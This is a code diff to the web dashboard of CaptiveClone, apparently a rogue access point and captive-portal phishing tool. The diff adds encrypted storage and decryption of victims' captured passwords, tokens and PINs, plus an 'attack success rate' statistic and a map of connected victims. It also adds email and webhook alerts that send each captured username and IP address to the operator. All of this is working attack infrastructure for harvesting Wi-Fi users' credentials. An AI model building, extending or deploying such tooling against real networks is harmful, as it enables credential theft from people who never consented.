@@ -12,10 +12,17 @@ from typing import Dict, List, Optional
 from pathlib import Path
 import threading
 import time
+import datetime
+from collections import defaultdict
+import hmac
+import hashlib
+import base64
+from cryptography.fernet import Fernet
 
 from flask import Flask, request, render_template, jsonify, send_from_directory, redirect, url_for, flash
 from flask_socketio import SocketIO
 from werkzeug.utils import secure_filename
+from flask_mail import Mail, Message
 
 from captiveclone.core.portal_analyzer import PortalAnalyzer
 from captiveclone.core.portal_cloner import PortalCloner
@@ -84,6 +91,12 @@ class WebInterface:
         # Register credential observer for real-time updates
         self.credentials.register_observer(self._credential_callback)
         
+        # Encryption key for credentials
+        self._generate_encryption_key()
+        
+        # Mail configuration for notifications
+        self._configure_mail()
+        
         # Configure Flask app
         self._configure_app()
     
@@ -108,6 +121,17 @@ class WebInterface:
         self.app.route("/dashboard")(self.dashboard)
         self.app.route("/credentials")(self.view_credentials)
         self.app.route("/credentials/export", methods=["POST"])(self.export_credentials)
+        
+        # Data visualization API endpoints
+        self.app.route("/api/stats/credentials/timeline")(self.api_credential_timeline)
+        self.app.route("/api/stats/clients")(self.api_client_stats)
+        self.app.route("/api/stats/success_rate")(self.api_success_rate)
+        self.app.route("/api/network-map")(self.api_network_map)
+        self.app.route("/api/notification-settings", methods=["POST"])(self.api_save_notification_settings)
+        
+        # Enhanced notification endpoints
+        self.app.route("/notification-settings")(self.notification_settings)
+        self.app.route("/notification-test/<notification_type>")(self.test_notification)
         
         # Error handlers
         self.app.errorhandler(404)(self.page_not_found)
@@ -397,28 +421,40 @@ class WebInterface:
         return redirect(url_for("deauthenticate"))
     
     def dashboard(self):
-        """Dashboard for monitoring connected clients and captures."""
-        clients = {}
-        credentials = []
-        target_network = None
+        """Dashboard page for monitoring attack status."""
+        # Get statistics for dashboard
+        client_stats = self._get_client_stats()
+        credential_stats = self._get_credential_stats()
         
-        if self.deauth_running and self.deauth:
-            clients = self.deauth.get_active_clients()
-            target_network = self.deauth.target_network
-        
-        credentials = self.credentials.get_recent_credentials(10)
-        
-        return render_template("dashboard.html",
-                              clients=clients,
-                              credentials=credentials,
-                              target_network=target_network,
+        return render_template("dashboard.html", 
                               ap_running=self.ap_running,
                               deauth_running=self.deauth_running,
-                              capture_running=self.capture_running)
+                              capture_running=self.capture_running,
+                              client_stats=client_stats,
+                              credential_stats=credential_stats)
     
     def view_credentials(self):
         """View captured credentials."""
-        credentials = self.credentials.get_all_credentials()
+        # Get credentials, decrypt sensitive fields
+        raw_credentials = self.credentials.get_all_credentials()
+        encrypted_fields = ['password', 'token', 'pin', 'secret']
+        
+        # Decrypt sensitive fields
+        credentials = []
+        for cred in raw_credentials:
+            decrypted_cred = dict(cred)
+            for field in encrypted_fields:
+                if field in decrypted_cred and decrypted_cred[field]:
+                    try:
+                        # Check if it's encrypted (has the encrypted: prefix)
+                        if decrypted_cred[field].startswith('encrypted:'):
+                            encrypted_value = decrypted_cred[field][10:]
+                            decrypted_value = self.fernet.decrypt(encrypted_value.encode()).decode()
+                            decrypted_cred[field] = decrypted_value
+                    except Exception as e:
+                        logger.error(f"Error decrypting field {field}: {str(e)}")
+            credentials.append(decrypted_cred)
+        
         return render_template("credentials.html", credentials=credentials)
     
     def export_credentials(self):
@@ -451,16 +487,102 @@ class WebInterface:
             return [] 
     
     def _credential_callback(self, credential):
-        """Callback for new captured credentials."""
-        # Emit to all connected clients
-        self.socketio.emit('new_credential', credential)
+        """Callback for credential capture events."""
+        # Encrypt sensitive fields before storing
+        encrypted_credential = dict(credential)
+        encrypted_fields = ['password', 'token', 'pin', 'secret']
+        
+        for field in encrypted_fields:
+            if field in encrypted_credential and encrypted_credential[field]:
+                try:
+                    # Encrypt the field value if not already encrypted
+                    if not encrypted_credential[field].startswith('encrypted:'):
+                        encrypted_value = self.fernet.encrypt(encrypted_credential[field].encode()).decode()
+                        encrypted_credential[field] = f"encrypted:{encrypted_value}"
+                except Exception as e:
+                    logger.error(f"Error encrypting field {field}: {str(e)}")
+        
+        # Forward to SocketIO for real-time updates
+        self.socketio.emit('credential_captured', {
+            'ip_address': credential.get('ip_address', 'unknown'),
+            'username': credential.get('username', 'unknown'),
+            'timestamp': credential.get('timestamp', datetime.datetime.now().isoformat()),
+            'form_type': credential.get('form_type', 'unknown')
+        })
+        
+        # Send email notification if enabled
+        notification_config = self.config.get("notifications", {})
+        if notification_config.get("email", {}).get("enabled") and notification_config.get("events", {}).get("credential_captured"):
+            subject = "CaptiveClone: Credential Captured"
+            body = f"""A new credential was captured:
+            
+IP Address: {credential.get('ip_address', 'unknown')}
+Username: {credential.get('username', 'unknown')}
+Timestamp: {credential.get('timestamp', 'N/A')}
+Form Type: {credential.get('form_type', 'unknown')}
+            """
+            self._send_notification_email(subject, body)
+        
+        # Send webhook notification if enabled
+        if notification_config.get("webhook", {}).get("enabled") and notification_config.get("events", {}).get("credential_captured"):
+            webhook_data = {
+                "event": "credential_captured",
+                "data": {
+                    "ip_address": credential.get('ip_address', 'unknown'),
+                    "username": credential.get('username', 'unknown'),
+                    "timestamp": credential.get('timestamp', datetime.datetime.now().isoformat()),
+                    "form_type": credential.get('form_type', 'unknown')
+                }
+            }
+            self._send_webhook_notification(webhook_data)
     
     def _update_client_list(self):
-        """Background thread to update client list periodically."""
-        while self.deauth_running and self.deauth:
-            clients = self.deauth.get_active_clients()
-            self.socketio.emit('client_update', clients)
-            time.sleep(5)  # Update every 5 seconds
+        """Update the client list via SocketIO."""
+        if not self.ap or not hasattr(self.ap, "get_connected_clients"):
+            return
+        
+        if not self.ap.is_running():
+            return
+        
+        clients = self.ap.get_connected_clients()
+        self.socketio.emit('client_list_update', {
+            'clients': clients
+        })
+        
+        # Send notifications for new clients if enabled
+        notification_config = self.config.get("notifications", {})
+        if notification_config.get("events", {}).get("client_connected"):
+            for client in clients:
+                if client.get("status") == "connected" and client.get("new", False):
+                    # Client just connected, send notification
+                    self.socketio.emit('client_connected', {
+                        'mac_address': client.get('mac', 'unknown'),
+                        'ip_address': client.get('ip', 'unknown'),
+                        'hostname': client.get('hostname', 'unknown')
+                    })
+                    
+                    # Send email notification if enabled
+                    if notification_config.get("email", {}).get("enabled"):
+                        subject = "CaptiveClone: New Client Connected"
+                        body = f"""A new client connected to the rogue AP:
+                        
+MAC Address: {client.get('mac', 'unknown')}
+IP Address: {client.get('ip', 'unknown')}
+Hostname: {client.get('hostname', 'unknown')}
+                        """
+                        self._send_notification_email(subject, body)
+                    
+                    # Send webhook notification if enabled
+                    if notification_config.get("webhook", {}).get("enabled"):
+                        webhook_data = {
+                            "event": "client_connected",
+                            "data": {
+                                "mac_address": client.get('mac', 'unknown'),
+                                "ip_address": client.get('ip', 'unknown'),
+                                "hostname": client.get('hostname', 'unknown')
+                            }
+                        }
+                        self._send_webhook_notification(webhook_data)
     
     def _start_capture_endpoint(self):
         """Start the credential capture endpoint."""
@@ -485,4 +607,351 @@ class WebInterface:
     
     def _socket_disconnect(self):
         """Handle SocketIO disconnection."""
-        logger.debug("Client disconnected from SocketIO") 
+        logger.debug("Client disconnected from SocketIO")
+    
+    def _generate_encryption_key(self) -> None:
+        """Generate or load encryption key for credentials."""
+        key_path = Path(self.config.get("security", {}).get("key_file", "credential_key.key"))
+        
+        if key_path.exists():
+            with open(key_path, "rb") as key_file:
+                self.encryption_key = key_file.read()
+        else:
+            self.encryption_key = Fernet.generate_key()
+            # Ensure directory exists
+            key_path.parent.mkdir(parents=True, exist_ok=True)
+            with open(key_path, "wb") as key_file:
+                key_file.write(self.encryption_key)
+        
+        self.fernet = Fernet(self.encryption_key)
+    
+    def _configure_mail(self) -> None:
+        """Configure mail for notifications."""
+        mail_config = self.config.get("notifications", {}).get("mail", {})
+        
+        self.mail_enabled = mail_config.get("enabled", False)
+        if self.mail_enabled:
+            self.app.config.update(
+                MAIL_SERVER=mail_config.get("server", "smtp.gmail.com"),
+                MAIL_PORT=mail_config.get("port", 587),
+                MAIL_USE_TLS=mail_config.get("use_tls", True),
+                MAIL_USERNAME=mail_config.get("username"),
+                MAIL_PASSWORD=mail_config.get("password"),
+                MAIL_DEFAULT_SENDER=mail_config.get("default_sender")
+            )
+            self.mail = Mail(self.app)
+        else:
+            self.mail = None
+    
+    def notification_settings(self):
+        """Notification settings page."""
+        return render_template("notification_settings.html")
+    
+    def test_notification(self, notification_type):
+        """Test a specific notification type."""
+        if notification_type == "email":
+            if not self.mail_enabled:
+                flash("Email notifications are not configured.", "error")
+                return redirect(url_for("notification_settings"))
+                
+            try:
+                msg = Message("CaptiveClone Test Notification",
+                             recipients=[request.args.get("email")])
+                msg.body = "This is a test notification from CaptiveClone."
+                self.mail.send(msg)
+                flash("Test email sent successfully.", "success")
+            except Exception as e:
+                flash(f"Error sending test email: {str(e)}", "error")
+                
+        elif notification_type == "webhook":
+            webhook_url = request.args.get("webhook_url")
+            if not webhook_url:
+                flash("No webhook URL provided.", "error")
+                return redirect(url_for("notification_settings"))
+                
+            try:
+                # Send test webhook
+                webhook_data = {
+                    "title": "Test Webhook",
+                    "message": "This is a test webhook notification from CaptiveClone.",
+                    "timestamp": datetime.datetime.now().isoformat(),
+                    "type": "test"
+                }
+                
+                import requests
+                response = requests.post(webhook_url, json=webhook_data, timeout=5)
+                
+                if response.status_code < 400:
+                    flash("Test webhook sent successfully.", "success")
+                else:
+                    flash(f"Error sending webhook: {response.status_code}", "error")
+            except Exception as e:
+                flash(f"Error sending test webhook: {str(e)}", "error")
+        
+        return redirect(url_for("notification_settings"))
+    
+    # API Endpoints for Data Visualization
+    
+    def api_credential_timeline(self):
+        """API endpoint for credential capture timeline data."""
+        # Get all credentials
+        credentials = self.credentials.get_all_credentials()
+        
+        # Group by hour
+        timeline = defaultdict(int)
+        
+        for cred in credentials:
+            timestamp = cred.get("timestamp")
+            if timestamp:
+                try:
+                    dt = datetime.datetime.fromisoformat(timestamp)
+                    hour_key = dt.strftime("%Y-%m-%d %H:00")
+                    timeline[hour_key] += 1
+                except Exception as e:
+                    logger.error(f"Error parsing timestamp: {str(e)}")
+        
+        # Sort by time and prepare for chart
+        sorted_timeline = sorted(timeline.items())
+        
+        return jsonify({
+            "labels": [item[0] for item in sorted_timeline],
+            "values": [item[1] for item in sorted_timeline]
+        })
+    
+    def api_client_stats(self):
+        """API endpoint for client statistics."""
+        stats = self._get_client_stats()
+        return jsonify(stats)
+    
+    def api_success_rate(self):
+        """API endpoint for attack success rate."""
+        # Get credential success/failure stats
+        credentials = self.credentials.get_all_credentials()
+        
+        success = sum(1 for cred in credentials if cred.get("success", True))
+        failure = sum(1 for cred in credentials if not cred.get("success", True))
+        
+        return jsonify({
+            "success": success,
+            "failure": failure
+        })
+    
+    def api_network_map(self):
+        """API endpoint for network map data."""
+        nodes = []
+        links = []
+        
+        # Get access point data
+        if self.ap and hasattr(self.ap, "interface") and self.ap.is_running():
+            ap_node = {
+                "id": "ap_" + self.ap.interface,
+                "name": self.ap.ssid,
+                "type": "ap",
+                "is_target": True,
+                "channel": self.ap.channel,
+                "clientCount": 0
+            }
+            nodes.append(ap_node)
+            
+            # Get connected clients
+            clients = self.ap.get_connected_clients() if hasattr(self.ap, "get_connected_clients") else []
+            
+            for client in clients:
+                client_id = "client_" + client["mac"]
+                
+                # Add client node
+                client_node = {
+                    "id": client_id,
+                    "mac": client["mac"],
+                    "type": "client",
+                    "status": client.get("status", "connected"),
+                    "connected_to": ap_node["id"]
+                }
+                nodes.append(client_node)
+                
+                # Add link
+                links.append({
+                    "source": client_id,
+                    "target": ap_node["id"],
+                    "value": 1
+                })
+                
+                # Increment client count
+                ap_node["clientCount"] += 1
+        
+        # Add nearby networks if scanner has results
+        if self.networks:
+            for network in self.networks:
+                if network.bssid and network.ssid:
+                    network_id = "network_" + network.bssid
+                    
+                    # Skip if this is our AP
+                    if self.ap and hasattr(self.ap, "bssid") and network.bssid == self.ap.bssid:
+                        continue
+                    
+                    # Add network node
+                    network_node = {
+                        "id": network_id,
+                        "name": network.ssid,
+                        "type": "ap",
+                        "is_target": False,
+                        "channel": network.channel,
+                        "clientCount": 0
+                    }
+                    nodes.append(network_node)
+        
+        return jsonify({
+            "nodes": nodes,
+            "links": links
+        })
+    
+    def api_save_notification_settings(self):
+        """API endpoint to save notification settings."""
+        try:
+            settings = request.json
+            
+            # Validate email if enabled
+            if settings.get("enableEmailAlerts") and not settings.get("emailAddress"):
+                return jsonify({"success": False, "error": "Email address is required"})
+            
+            # Validate webhook if enabled
+            if settings.get("enableWebhooks") and not settings.get("webhookUrl"):
+                return jsonify({"success": False, "error": "Webhook URL is required"})
+            
+            # Save to config
+            notification_config = self.config.get("notifications", {})
+            notification_config.update({
+                "browser": settings.get("enableBrowserNotifications", True),
+                "sound": settings.get("enableSoundAlerts", True),
+                "email": {
+                    "enabled": settings.get("enableEmailAlerts", False),
+                    "address": settings.get("emailAddress", "")
+                },
+                "webhook": {
+                    "enabled": settings.get("enableWebhooks", False),
+                    "url": settings.get("webhookUrl", "")
+                },
+                "events": {
+                    "client_connected": settings.get("notifyOnNewClients", True),
+                    "credential_captured": settings.get("notifyOnCredentials", True),
+                    "attack_status": settings.get("notifyOnAttackStatus", True)
+                }
+            })
+            
+            self.config.set("notifications", notification_config)
+            self.config.save()
+            
+            return jsonify({"success": True})
+        except Exception as e:
+            logger.error(f"Error saving notification settings: {str(e)}")
+            return jsonify({"success": False, "error": str(e)})
+    
+    # Helper methods for data and statistics
+    
+    def _get_client_stats(self) -> Dict:
+        """Get client statistics."""
+        total_clients = 0
+        connected = 0
+        deauthenticated = 0
+        captured = 0
+        
+        # Get clients from AP if running
+        if self.ap and hasattr(self.ap, "get_connected_clients") and self.ap.is_running():
+            clients = self.ap.get_connected_clients()
+            total_clients = len(clients)
+            
+            for client in clients:
+                status = client.get("status", "")
+                if status == "connected":
+                    connected += 1
+                elif status == "deauthenticated":
+                    deauthenticated += 1
+        
+        # Count captured credentials (unique IPs)
+        credentials = self.credentials.get_all_credentials()
+        captured_ips = set()
+        
+        for cred in credentials:
+            ip = cred.get("ip_address")
+            if ip:
+                captured_ips.add(ip)
+        
+        captured = len(captured_ips)
+        
+        return {
+            "total_clients": total_clients,
+            "connected": connected,
+            "deauthenticated": deauthenticated,
+            "captured": captured
+        }
+    
+    def _get_credential_stats(self) -> Dict:
+        """Get credential statistics."""
+        credentials = self.credentials.get_all_credentials()
+        
+        total = len(credentials)
+        
+        # Count by credential type
+        types = defaultdict(int)
+        for cred in credentials:
+            form_type = cred.get("form_type", "unknown")
+            types[form_type] += 1
+        
+        # Get most recent
+        recent = []
+        if credentials:
+            # Sort by timestamp (descending)
+            sorted_creds = sorted(
+                credentials, 
+                key=lambda x: x.get("timestamp", ""), 
+                reverse=True
+            )
+            recent = sorted_creds[:5]  # Get 5 most recent
+        
+        return {
+            "total": total,
+            "types": dict(types),
+            "recent": recent
+        }
+    
+    # Notification methods
+    
+    def _send_notification_email(self, subject: str, body: str) -> bool:
+        """Send notification email."""
+        if not self.mail_enabled or not self.mail:
+            return False
+        
+        try:
+            email_config = self.config.get("notifications", {}).get("email", {})
+            if not email_config.get("enabled"):
+                return False
+            
+            recipient = email_config.get("address")
+            if not recipient:
+                return False
+            
+            msg = Message(subject, recipients=[recipient])
+            msg.body = body
+            self.mail.send(msg)
+            return True
+        except Exception as e:
+            logger.error(f"Error sending notification email: {str(e)}")
+            return False
+    
+    def _send_webhook_notification(self, data: Dict) -> bool:
+        """Send webhook notification."""
+        try:
+            webhook_config = self.config.get("notifications", {}).get("webhook", {})
+            if not webhook_config.get("enabled"):
+                return False
+            
+            webhook_url = webhook_config.get("url")
+            if not webhook_url:
+                return False
+            
+            import requests
+            response = requests.post(webhook_url, json=data, timeout=5)
+            return response.status_code < 400
+        except Exception as e:
+            logger.error(f"Error sending webhook notification: {str(e)}")
+            return False 
